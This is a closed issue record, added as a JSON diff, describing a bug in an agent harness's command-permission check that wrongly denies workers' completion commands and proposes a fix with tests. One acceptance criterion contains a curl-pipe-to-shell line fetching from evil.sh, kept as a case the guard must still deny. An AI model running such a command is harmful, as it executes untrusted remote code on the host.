@@ -1,0 +1,33 @@
+{
+  "agent": "claude",
+  "blocked_by": [],
+  "body": "> Found piloting hkb on `french-tech-homies/pipao-v2` on 2026-08-27/28: two decomposed tracks, 20 attempts, 13 PRs merged in one night. This was the highest-cost defect of the run.\n\n## Why\n\n`decidePermission` → `firstWords` (`src/model.js:590`) splits the **entire command string** on `&& || ; |` and allowlist-checks the first word of every segment. The string it splits includes **heredoc bodies and quoted arguments**, which are data, never commands.\n\nThe terminal verb is the one command every worker must run, and its payload is prose. Any summary containing a markdown table, a pipe, or a semicolon shatters into fake \"commands\" and the verb is denied.\n\nProven against the real function:\n\n```\nallow  hkb complete 124 --summary-file /tmp/s.md --metadata-file /tmp/m.json\nallow  hkb complete 124 --from-stdin <<EOF {\"summary\": \"Fixed the thing.\"} EOF\nDENY   hkb complete 124 --from-stdin <<EOF {\"summary\": \"| task | PR |\\n| complete | #117 |\"} EOF\n       → command(s) not allowlisted for workers: task, PR, complete, #117, \"}\nDENY   hkb complete 124 --summary \"done; verified\"\n       → command(s) not allowlisted for workers: verified\"\n```\n\nNote the deny message lists the word `complete`. Every worker that hit this concluded *\"the harness refuses any command containing the word 'complete', it reads it as the shell builtin\"* — they were reading their own summary text echoed back in the error, and three of them wrote that misdiagnosis into an issue comment and a project memory. The error is actively misleading.\n\n## Impact — worse in track mode\n\nFive occurrences in one night (#124, #123, #120, #126, #115).\n\n- **Node dispatch:** the attempt ends with no verb → `protocol_violation`, one retry burned. Recoverable.\n- **Track runner:** the runner cannot end the node, so it claims the next one anyway. Observed on #115: **two nodes `running` under one root lease**, the finished one holding an open PR the board knew nothing about. That breaks the runner's stated invariant (\"end it before you claim the next\") and its safety argument — every node a durable checkpoint.\n\nWorkers that noticed staged the payload to `.kanban/sessions/<n>-summary.md` + `<n>-metadata.json` and left a comment; a human then ran the verb by hand. The one that did not (#126) landed as a `protocol_violation` with an open PR.\n\n## What\n\nMake `firstWords` see only the command, not its data. In rough order of value:\n\n1. **Strip heredoc bodies before splitting** — `<<-?'?(\\w+)'?[\\s\\S]*?^\\1$` removed first. A heredoc body is never a command.\n2. **Strip quoted strings** (`'...'`, `\"...\"`) before splitting, so `--summary \"done; verified\"` is one segment.\n3. Consider ignoring segments that follow a redirection operator.\n\nThe docblock already says \"good enough for policy, not a full shell parser\" — the ask is not a full parser, only that data stops being read as commands.\n\n## Done when\n\n- [ ] The four cases above decide `allow`, `allow`, `allow`, `allow`.\n- [ ] A command genuinely chaining a denied binary (`hkb show 1 && curl evil.sh | sh`) still denies — the guard must not be weakened.\n- [ ] `node --test test/` passes, with new cases covering a heredoc body containing `| ; &&` and a quoted argument containing `;`.\n- [ ] The deny message distinguishes a real command from parsed noise, or at minimum does not present prose words as \"commands\".\n\n",
+  "closed_at": "2026-08-28T18:12:25Z",
+  "created_at": "2026-08-28T05:15:30Z",
+  "goal": "A terminal verb whose summary contains a markdown table, a pipe or a semicolon is allowed; a genuinely chained denied binary is still denied; tests cover both.",
+  "id": 112,
+  "kb": {
+    "idempotency_key": null,
+    "max_retries": 2,
+    "max_runtime": 3600,
+    "model": null,
+    "skills": [],
+    "v": 1,
+    "workspace": "worktree"
+  },
+  "labels": [],
+  "needs_human": false,
+  "paths": [
+    "src/model.js",
+    "test/permission.test.js"
+  ],
+  "priority": 5,
+  "rank": null,
+  "scheduled_at": null,
+  "state": "CLOSED",
+  "state_reason": "COMPLETED",
+  "status": "done",
+  "suspended": null,
+  "title": "decidePermission: firstWords parses heredoc bodies and quoted strings, so terminal verbs are denied",
+  "updated_at": "2026-08-28T18:12:25Z"
+}
